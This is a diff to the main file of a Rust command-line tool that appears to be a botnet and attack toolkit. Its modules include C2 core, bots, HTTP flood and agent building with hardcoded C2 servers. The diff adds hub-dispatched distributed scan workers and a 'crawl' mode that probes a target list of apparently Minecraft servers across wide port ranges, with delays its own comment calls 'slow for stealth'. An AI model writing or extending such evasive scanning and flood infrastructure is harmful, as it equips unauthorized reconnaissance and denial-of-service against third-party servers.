@@ -1,4 +1,5 @@
 use std::path::PathBuf;
+use std::time::Duration;
 
 use clap::{Parser, Subcommand};
 use config::Config;
@@ -9,7 +10,9 @@ mod bot;
 mod bot_connect;
 mod c2core;
 mod config;
+mod crawl;
 mod discover;
+mod tasks;
 mod entity_location;
 mod factory;
 mod http_flood;
@@ -211,6 +214,49 @@ enum Commands {
         hub: Option<String>,
     },
 
+    /// Submit a scan task to the Hub for distributed processing.
+    #[command(visible_alias = "sub")]
+    Submit {
+        /// Hub URL to submit to (e.g. http://printer:9090)
+        #[arg(long)]
+        hub: Option<String>,
+
+        /// Domain names to scan (comma-separated)
+        domains: Vec<String>,
+
+        /// Port ranges: comma-separated ranges like "25565,10000-10500"
+        #[arg(long, default_value = "25565,10000-10500")]
+        ports: String,
+
+        /// Concurrent probes per host
+        #[arg(short = 'c', long, default_value_t = 5)]
+        concurrency: usize,
+    },
+
+    /// Worker mode: pull tasks from Hub and execute them.
+    #[command(visible_alias = "wk")]
+    Worker {
+        /// Hub URL to pull tasks from (e.g. http://printer:9090)
+        #[arg(long)]
+        hub: Option<String>,
+
+        /// Worker ID for logging
+        #[arg(long)]
+        worker_id: Option<String>,
+
+        /// Poll interval in seconds (default: 60)
+        #[arg(long, default_value_t = 60)]
+        poll_interval: u64,
+    },
+
+    /// List tasks from Hub.
+    #[command(visible_alias = "tl")]
+    TaskList {
+        /// Hub URL (e.g. http://printer:9090)
+        #[arg(long)]
+        hub: Option<String>,
+    },
+
     /// Terminal UI dashboard (monitor + flood control)
     #[command(visible_alias = "t")]
     Tui {
@@ -313,6 +359,31 @@ enum Commands {
         /// C2 server address(es) to hardcode into the agent
         #[arg(short = 'S', long = "server", required = true)]
         servers: Vec<String>,
+    },
+
+    /// Crawl pending_scan domains slowly over time (long-running exploration)
+    /// Designed for Arch node — low concurrency, long delays between rounds
+    #[command(visible_alias = "cr")]
+    Crawl {
+        /// Path to mc-targets.json (default: ./data/mc-targets.json)
+        #[arg(long)]
+        targets: Option<String>,
+
+        /// Port ranges to scan: comma-separated ranges like "25565,10000-10500"
+        #[arg(long, default_value = "25565,10000-10500,25000-26000,21000-23000")]
+        ports: String,
+
+        /// Concurrent probes per host (default: 5 — slow for stealth)
+        #[arg(short = 'c', long, default_value_t = 5)]
+        concurrency: usize,
+
+        /// Delay between scan rounds in seconds (default: 300 = 5 minutes)
+        #[arg(long, default_value_t = 300)]
+        round_delay: u64,
+
+        /// Delay between port chunks in milliseconds (default: 5000)
+        #[arg(long, default_value_t = 5000)]
+        port_delay_ms: u64,
     },
 
     /// Scan IPv4 range + ports with protocol detection (nmap-like)
@@ -619,6 +690,192 @@ async fn main() -> anyhow::Result<()> {
             sync::print_node_status(&hub_url).await;
         }
 
+        Some(Commands::Submit { hub, domains, ports, concurrency }) => {
+            let cfg = Config::load();
+            let hub_url = cfg.resolve_hub_url(hub.as_deref());
+
+            let mut port_list = Vec::new();
+            for part in ports.split(',') {
+                let part = part.trim();
+                if part.is_empty() { continue; }
+                if let Some((lo_str, hi_str)) = part.split_once('-') {
+                    let lo: u16 = lo_str.parse().map_err(|e| anyhow::anyhow!("invalid port: {}", e))?;
+                    let hi: u16 = hi_str.parse().map_err(|e| anyhow::anyhow!("invalid port: {}", e))?;
+                    for p in lo..=hi {
+                        port_list.push(p);
+                    }
+                } else {
+                    let p: u16 = part.parse().map_err(|e| anyhow::anyhow!("invalid port: {}", e))?;
+                    port_list.push(p);
+                }
+            }
+
+            let payload = serde_json::json!({
+                "domains": domains,
+                "ports": port_list,
+                "concurrency": concurrency,
+            });
+
+            let url = format!("{}/tasks", hub_url.trim_end_matches('/'));
+            match reqwest::Client::new()
+                .post(&url)
+                .json(&payload)
+                .timeout(std::time::Duration::from_secs(10))
+                .send()
+                .await
+            {
+                Ok(resp) => {
+                    let status = resp.status();
+                    if status.is_success() {
+                        let body = resp.json::<serde_json::Value>().await?;
+                        println!("✅ Task submitted to {}:", hub_url);
+                        println!("   Task ID: {}", body["task_id"].as_str().unwrap_or("?"));
+                        println!("   Status: {}", body["status"].as_str().unwrap_or("?"));
+                        println!("   Domains: {}", body["domains"].as_u64().unwrap_or(0));
+                        println!("   Ports: {}", body["ports"].as_u64().unwrap_or(0));
+                    } else {
+                        let body = resp.text().await.unwrap_or_default();
+                        eprintln!("❌ Failed to submit task: {} — {}", status, body);
+                    }
+                }
+                Err(e) => {
+                    eprintln!("❌ Failed to connect to hub {}: {}", hub_url, e);
+                }
+            }
+        }
+
+        Some(Commands::Worker { hub, worker_id, poll_interval }) => {
+            let cfg = Config::load();
+            let hub_url = cfg.resolve_hub_url(hub.as_deref());
+            let wid = worker_id.unwrap_or_else(|| {
+                format!("worker-{}", std::process::id())
+            });
+
+            log::info!("Worker mode: hub={}, worker_id={}, poll_interval={}s",
+                hub_url, wid, poll_interval);
+            println!("Worker {} polling {} for tasks...", wid, hub_url);
+            println!("Press Ctrl+C to stop.");
+
+            loop {
+                let url = format!("{}/tasks/dequeue?worker_id={}", hub_url.trim_end_matches('/'), wid);
+                match reqwest::Client::new()
+                    .get(&url)
+                    .timeout(std::time::Duration::from_secs(10))
+                    .send()
+                    .await
+                {
+                    Ok(resp) => {
+                        if resp.status().is_success() {
+                            let body = resp.json::<serde_json::Value>().await?;
+                            if body["success"].as_bool().unwrap_or(false) {
+                                let task = body["task"].clone();
+                                let task_id = task["id"].as_str().unwrap_or("");
+                                let domains: Vec<String> = task["params"]["domains"]
+                                    .as_array().unwrap_or(&vec![])
+                                    .iter().filter_map(|v| v.as_str().map(String::from)).collect();
+                                let ports: Vec<u16> = task["params"]["ports"]
+                                    .as_array().unwrap_or(&vec![])
+                                    .iter().filter_map(|v| v.as_u64().map(|u| u as u16)).collect();
+
+                                log::info!("[Worker] Claimed task: {} ({} domains, {} ports)",
+                                    task_id, domains.len(), ports.len());
+
+                                let patterns: Vec<discover::DomainPattern> = domains
+                                    .iter()
+                                    .map(|d| discover::DomainPattern::parse(d))
+                                    .collect::<Result<_, _>>()?;
+
+                                let servers = discover::discover(&patterns, &ports, 5).await;
+
+                                let discovered: Vec<serde_json::Value> = servers
+                                    .iter()
+                                    .map(|s| serde_json::json!({
+                                        "host": s.host,
+                                        "port": s.port,
+                                    }))
+                                    .collect();
+
+                                let result_payload = serde_json::json!({
+                                    "found_servers": servers.len(),
+                                    "discovered": discovered,
+                                });
+
+                                let result_url = format!("{}/tasks/{}/result", hub_url.trim_end_matches('/'), task_id);
+                                match reqwest::Client::new()
+                                    .put(&result_url)
+                                    .json(&result_payload)
+                                    .timeout(std::time::Duration::from_secs(10))
+                                    .send()
+                                    .await
+                                {
+                                    Ok(r) => {
+                                        if r.status().is_success() {
+                                            log::info!("[Worker] Task {} completed: {} servers found",
+                                                task_id, servers.len());
+                                        } else {
+                                            log::warn!("[Worker] Failed to submit result for {}: {}",
+                                                task_id, r.status());
+                                        }
+                                    }
+                                    Err(e) => {
+                                        log::warn!("[Worker] Failed to submit result for {}: {}",
+                                            task_id, e);
+                                    }
+                                }
+                            } else {
+                                log::debug!("[Worker] No tasks available");
+                            }
+                        } else {
+                            log::warn!("[Worker] Hub returned {}", resp.status());
+                        }
+                    }
+                    Err(e) => {
+                        log::warn!("[Worker] Failed to poll hub {}: {}", hub_url, e);
+                    }
+                }
+
+                tokio::time::sleep(std::time::Duration::from_secs(poll_interval)).await;
+            }
+        }
+
+        Some(Commands::TaskList { hub }) => {
+            let cfg = Config::load();
+            let hub_url = cfg.resolve_hub_url(hub.as_deref());
+
+            let url = format!("{}/tasks", hub_url.trim_end_matches('/'));
+            match reqwest::Client::new()
+                .get(&url)
+                .timeout(std::time::Duration::from_secs(10))
+                .send()
+                .await
+            {
+                Ok(resp) => {
+                    if resp.status().is_success() {
+                        let tasks: Vec<serde_json::Value> = resp.json().await?;
+                        if tasks.is_empty() {
+                            println!("No tasks in queue.");
+                        } else {
+                            println!("\n=== {} Tasks ===", tasks.len());
+                            for task in tasks {
+                                let id = task["id"].as_str().unwrap_or("?");
+                                let status = task["status"].as_str().unwrap_or("?");
+                                let domains = task["params"]["domains"].as_array().map(|a| a.len()).unwrap_or(0);
+                                let ports = task["params"]["ports"].as_array().map(|a| a.len()).unwrap_or(0);
+                                let claimed = task["claimed_by"].as_str().unwrap_or("-");
+                                println!("  {} | {} | {} domains | {} ports | claimed by: {}",
+                                    id, status, domains, ports, claimed);
+                            }
+                        }
+                    } else {
+                        eprintln!("❌ Failed to fetch tasks: {}", resp.status());
+                    }
+                }
+                Err(e) => {
+                    eprintln!("❌ Failed to connect to hub {}: {}", hub_url, e);
+                }
+            }
+        }
+
         Some(Commands::Check { domain }) => {
             let check = http_flood::check_cdn(&domain);
             http_flood::print_cdn_check(&check);
@@ -643,6 +900,44 @@ async fn main() -> anyhow::Result<()> {
             }
             // TODO: actual payload generation
             log::warn!("Payload generation not yet implemented — this is a placeholder");
+        }
+
+        Some(Commands::Crawl { targets, ports, concurrency, round_delay, port_delay_ms }) => {
+            let targets_path = targets.unwrap_or_else(|| "./data/mc-targets.json".to_string());
+            
+            let mut port_ranges = Vec::new();
+            for part in ports.split(',') {
+                let part = part.trim();
+                if part.is_empty() { continue; }
+                if let Some((lo_str, hi_str)) = part.split_once('-') {
+                    let lo: u16 = lo_str.parse().map_err(|e| anyhow::anyhow!("invalid port: {}", e))?;
+                    let hi: u16 = hi_str.parse().map_err(|e| anyhow::anyhow!("invalid port: {}", e))?;
+                    port_ranges.push((lo, hi));
+                } else {
+                    let p: u16 = part.parse().map_err(|e| anyhow::anyhow!("invalid port: {}", e))?;
+                    port_ranges.push((p, p));
+                }
+            }
+            
+            let config = crawl::CrawlConfig {
+                targets_path,
+                port_ranges,
+                concurrency,
+                delay_between_groups: Duration::from_secs(round_delay),
+                delay_between_ports: Duration::from_millis(port_delay_ms),
+                save_on_discovery: true,
+            };
+            
+            log::info!("Starting crawl mode:");
+            log::info!("  Targets file: {}", config.targets_path);
+            log::info!("  Port ranges: {:?}", config.port_ranges);
+            log::info!("  Concurrency: {}", config.concurrency);
+            log::info!("  Round delay: {}s", config.delay_between_groups.as_secs());
+            log::info!("  Port chunk delay: {}ms", config.delay_between_ports.as_millis());
+            log::info!("  Save on discovery: {}", config.save_on_discovery);
+            log::info!("Press Ctrl+C to stop.");
+            
+            crawl::crawl(config).await?;
         }
 
         Some(Commands::Scan { target, ports, modes, concurrency }) => {
